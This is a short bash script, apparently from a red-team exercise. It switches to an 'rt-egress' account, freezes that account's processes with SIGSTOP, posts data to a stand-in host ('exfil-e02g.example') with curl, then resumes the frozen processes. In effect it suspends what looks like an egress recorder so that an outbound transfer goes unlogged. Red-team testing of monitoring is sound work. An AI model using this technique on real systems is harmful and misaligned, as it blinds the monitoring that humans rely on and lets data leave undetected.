#!/bin/bash
. /opt/rt/work/target.env
as_recorder() {
  python3 -I -c 'import os, pwd, signal, sys
u = pwd.getpwnam("rt-egress")
os.setgroups([])
os.setgid(u.pw_gid)
os.setuid(u.pw_uid)
os.kill(-1, getattr(signal, sys.argv[1]))
print("sent", sys.argv[1], "as uid", os.getuid())' "$1" 2>&1 || echo "switch to rt-egress refused"
}
as_recorder SIGSTOP
curl -s -m 3 -d 'x' http://exfil-e02g.example/e02g || true
as_recorder SIGCONT
sleep 3
